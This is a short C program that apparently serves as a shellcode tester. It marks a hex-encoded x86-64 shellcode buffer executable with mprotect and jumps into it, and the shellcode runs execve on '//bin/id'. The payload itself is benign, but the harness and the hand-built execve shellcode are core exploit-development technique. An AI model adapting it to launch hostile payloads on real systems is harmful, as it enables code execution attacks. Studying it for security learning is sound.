#include<stdio.h>
#include<stdint.h>
#include<sys/mman.h>

char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x69\x64\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

void main(){
        mprotect((void *)((uintptr_t)shellcode & ~4095),
                        ((uintptr_t)shellcode & 4095) + sizeof(shellcode),
                        PROT_READ | PROT_WRITE | PROT_EXEC);

       ( *(void (*)()) shellcode)() ;

        printf("NO ID");
}
